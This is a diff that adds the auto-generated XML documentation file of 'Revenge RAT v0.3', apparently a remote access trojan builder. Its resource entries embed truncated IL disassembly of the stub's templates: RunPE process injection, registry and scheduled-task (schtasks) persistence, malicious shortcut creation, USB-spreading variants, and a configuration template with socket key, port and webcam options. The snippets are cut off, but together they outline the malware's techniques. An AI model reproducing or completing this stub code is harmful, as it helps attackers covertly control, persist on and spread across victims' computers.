+      IL_0011:  callvirt   instance void [System]System.Diagnostics.Process::set_PriorityClass(valuetype [System]System.Diagnostics.ProcessPriorityClass)
+      IL_0016:  nop
+      IL_0017:  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.PU">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Registry">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_039d:  nop
+      IL_039e:  ldarg.0
+      IL_039f:  ldstr      &quot;%RGP%&quot;
+      IL_03a4:  ldstr      &quot;%REGV%&quot;
+      IL_03a9:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_03ae:  call       instance object Nuclear_Explosion.Atomic::IR(string,
+                                                                        string,
+                                                                        string)
+      IL_03b3:  pop
+      IL_03b4:  leave.s    IL_03c3
+
+    }  // end [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RegistryCall">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_05d9:  nop
+      IL_05da:  ldarg.0
+      IL_05db:  ldftn      instance void Nuclear_Explosion.Atomic::RGPR()
+      IL_05e1:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
+                                                                                       native int)
+      IL_05e6:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
+      IL_05eb:  stloc.s    V_15
+      IL_05ed:  ldlo [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RegistryCallUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_066f:  nop
+      IL_0670:  ldarg.0
+      IL_0671:  ldftn      instance void Nuclear_Explosion.Atomic::RGPR()
+      IL_0677:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
+                                                                                       native int)
+      IL_067c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
+      IL_0681:  stloc.s    V_15
+      IL_0683:  ldlo [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RegistryMethod">
+<summary>
+  Looks up a localized string similar to .method public instance void  RGPR() cil managed
+  {
+    // Code size       127 (0x7f)
+    .maxstack  4
+    .locals init (bool V_0,
+             bool V_1)
+    IL_0000:  nop
+    IL_0001:  nop
+    IL_0002:  ldc.i4     0x2710
+    IL_0007:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
+    IL_000c:  nop
+    IL_000d:  ldstr      &quot;%RGP%&quot;
+    IL_0012:  ldstr      &quot;%REGV%&quot;
+    IL_0017:  ldnull
+    IL_0018:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
+      [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RegistryMethodUSB">
+<summary>
+  Looks up a localized string similar to .method public instance void  RGPR() cil managed
+  {
+    // Code size       136 (0x88)
+    .maxstack  6
+    .locals init (bool V_0,
+             bool V_1)
+    IL_0000:  nop
+    IL_0001:  nop
+    IL_0002:  ldc.i4     0x2710
+    IL_0007:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
+    IL_000c:  nop
+    IL_000d:  ldstr      &quot;%RGP%&quot;
+    IL_0012:  ldstr      &quot;%REGV%&quot;
+    IL_0017:  ldnull
+    IL_0018:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
+      [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RegistryUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_03e2:  nop
+      IL_03e3:  ldarg.0
+      IL_03e4:  ldstr      &quot;%RGP%&quot;
+      IL_03e9:  ldstr      &quot;%REGV%&quot;
+      IL_03ee:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_03f3:  call       instance object Nuclear_Explosion.Atomic::IR(string,
+                                                                        string,
+                                                                        string)
+      IL_03f8:  pop
+      IL_03f9:  leave      IL_040e
+
+    }  // end [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Resource_Hacker">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Revenge">
+<summary>
+  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Rev&gt;
+&lt;Socket_Key&gt;
+&lt;![CDATA[%S%]]&gt;
+&lt;/Socket_Key&gt;
+&lt;Connections_Port&gt;
+&lt;![CDATA[%P%]]&gt;
+&lt;/Connections_Port&gt;
+&lt;Minimizing&gt;
+&lt;![CDATA[%M%]]&gt;
+&lt;/Minimizing&gt;
+&lt;Listening&gt;
+&lt;![CDATA[%L%]]&gt;
+&lt;/Listening&gt;
+&lt;Ping&gt;
+&lt;![CDATA[%T%]]&gt;
+&lt;/Ping&gt;
+&lt;Visual&gt;
+&lt;![CDATA[%V%]]&gt;
+&lt;/Visual&gt;
+&lt;Notification&gt;
+&lt;![CDATA[%N%]]&gt;
+&lt;/Notification&gt;
+&lt;Sound&gt;
+&lt;![CDATA[%SN%]]&gt;
+&lt;/Sound&gt;
+&lt;Desktop&gt;
+&lt;![CDATA[%D%]]&gt;
+&lt;/Desktop&gt;
+&lt;DesktopValue&gt;
+&lt;![CDATA[%DV%]]&gt;
+&lt;/DesktopValue&gt;
+&lt;Webcam&gt;
+&lt;![CDATA[%W [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1476116434_bullet_green">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1476116499_bullet_red">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1476172385_bullet_white">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1476172388_bullet_orange">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1481030093_chrome_512">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1481030174_pidgin">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1481030189_filezilla">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1481030222_firefox">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_1481030243_ip_block">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_filehistory_162">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_109">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_110">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_112">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_115">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_184">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_33">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_35">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_36">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_37">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_4">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_58">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_imageres_75">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_shell32_37219">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_shell32_51380">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.rsz_thumb_14378800210shortcut_arrow">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RUNF">
+<summary>
+  Looks up a localized string similar to IL_0137:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
+      IL_013c:  pop
+      IL_013d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
+      IL_0142:  nop.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RUNFUSB">
+<summary>
+  Looks up a localized string similar to IL_0158:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
+      IL_015d:  pop
+      IL_015e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
+      IL_0163:  nop.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RunPEClass">
+<summary>
+  Looks up a localized string similar to .class private auto ansi Nuclear_Explosion.RunPE
+       extends [mscorlib]System.Object
+{
+  .class sequential ansi sealed nested private Process_INFORMATION
+         extends [mscorlib]System.ValueType
+  {
+    .pack 1
+    .size 0
+    .field public native int ProcessHandle
+    .field public native int ThreadHandle
+    .field public uint32 ProcessId
+    .field public uint32 ThreadId
+  } // end of class Process_INFORMATION
+
+  .class sequential ansi sealed nested private STARTUP_INFORMATION
+       [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RunPEClassUSB">
+<summary>
+  Looks up a localized string similar to .class private auto ansi Nuclear_Explosion.RunPE
+       extends [mscorlib]System.Object
+{
+  .class sequential ansi sealed nested private Process_INFORMATION
+         extends [mscorlib]System.ValueType
+  {
+    .pack 1
+    .size 0
+    .field public native int ProcessHandle
+    .field public native int ThreadHandle
+    .field public uint32 ProcessId
+    .field public uint32 ThreadId
+  } // end of class Process_INFORMATION
+
+  .class sequential ansi sealed nested private STARTUP_INFORMATION
+       [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.RV">
+<summary>
+  Looks up a localized string similar to //  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
+//  Copyright (c) Microsoft Corporation.  All rights reserved.
+
+
+
+// Metadata version: v2.0.50727
+.module extern kernel32
+.module extern user32
+.module extern avicap32.dll
+.module extern psapi
+.module extern kernel32.dll
+.module extern ntdll.dll
+.module extern gdi32.dll
+.module extern user32.dll
+.module extern shell32.dll
+.assembly extern mscorlib
+{
+  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShortcutLnk">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_022e:  nop
+      IL_022f:  ldstr      &quot;WScript.Shell&quot;
+      IL_0234:  ldstr      &quot;&quot;
+      IL_0239:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
+                                                                                                         string)
+      IL_023e:  ldnull
+      IL_023f:  ldstr      &quot;CreateShortcut&quot;
+      IL_0244:  ldc.i4.1
+      IL_0245:  newarr     [mscorlib]System.Object
+      IL_024a:  dup
+      I [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShortcutLNKUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0261:  nop
+      IL_0262:  ldstr      &quot;WScript.Shell&quot;
+      IL_0267:  ldstr      &quot;&quot;
+      IL_026c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
+                                                                                                         string)
+      IL_0271:  ldnull
+      IL_0272:  ldstr      &quot;CreateShortcut&quot;
+      IL_0277:  ldc.i4.1
+      IL_0278:  newarr     [mscorlib]System.Object
+      IL_027d:  dup
+      I [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShortcutURL">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_02af:  nop
+      IL_02b0:  ldstr      &quot;WScript.Shell&quot;
+      IL_02b5:  ldstr      &quot;&quot;
+      IL_02ba:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
+                                                                                                         string)
+      IL_02bf:  ldnull
+      IL_02c0:  ldstr      &quot;CreateShortcut&quot;
+      IL_02c5:  ldc.i4.1
+      IL_02c6:  newarr     [mscorlib]System.Object
+      IL_02cb:  dup
+      I [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShortcutURLUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_02e8:  nop
+      IL_02e9:  ldstr      &quot;WScript.Shell&quot;
+      IL_02ee:  ldstr      &quot;&quot;
+      IL_02f3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
+                                                                                                         string)
+      IL_02f8:  ldnull
+      IL_02f9:  ldstr      &quot;CreateShortcut&quot;
+      IL_02fe:  ldc.i4.1
+      IL_02ff:  newarr     [mscorlib]System.Object
+      IL_0304:  dup
+      I [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShuldedTask">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_03c4:  nop
+      IL_03c5:  ldstr      &quot;schtasks /create /sc minute /mo %TT% /tn \&quot;%TNINL%\&quot;&quot;
+      + &quot; /tr \&quot;&quot;
+      IL_03ca:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_03cf:  ldstr      &quot;\&quot;&quot;
+      IL_03d4:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string,
+                                                                  string)
+      IL_03d9:  ldc.i4.0
+      IL_03da:  ldc.i4.0
+  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.ShuldedTaskUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_040f:  nop
+      IL_0410:  ldstr      &quot;schtasks /create /sc minute /mo %TT% /tn \&quot;%TNINL%\&quot;&quot;
+      + &quot; /tr \&quot;&quot;
+      IL_0415:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_041a:  ldstr      &quot;\&quot;&quot;
+      IL_041f:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string,
+                                                                  string)
+      IL_0424:  ldc.i4.0
+      IL_0425:  ldc.i4.0
+  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Sleep">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0001:  nop
+      IL_0002:  ldstr      &quot;%SLEEP%&quot;
+      IL_0007:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
+      IL_000c:  ldc.r8     1000.
+      IL_0015:  mul
+      IL_0016:  call       float64 [mscorlib]System.Math::Round(float64)
+      IL_001b:  conv.ovf.i4
+      IL_001c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
+      IL_0021:  nop
+      IL_0022:  leave.s    IL_0031
+
+    }  // end  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.SleepUSB">
+<summary>
+  Looks up a localized string similar to .try
+    {
+      IL_0001:  nop
+      IL_0002:  ldstr      &quot;%SLEEP%&quot;
+      IL_0007:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
+      IL_000c:  ldc.r8     1000.
+      IL_0015:  mul
+      IL_0016:  call       float64 [mscorlib]System.Math::Round(float64)
+      IL_001b:  conv.ovf.i4
+      IL_001c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
+      IL_0021:  nop
+      IL_0022:  leave      IL_0037
+
+    }  // end  [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Spring_Green">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Steel_Blue">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Teal">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.THE_MYSTERIES_LEGACY">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.Tsunamii">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.UNI">
+<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.v_B01___3hud">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:Revenge_RAT_v0._3.My.Resources.Resources.window_app_blank_icon">
+<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member>
+</members>
+</doc>
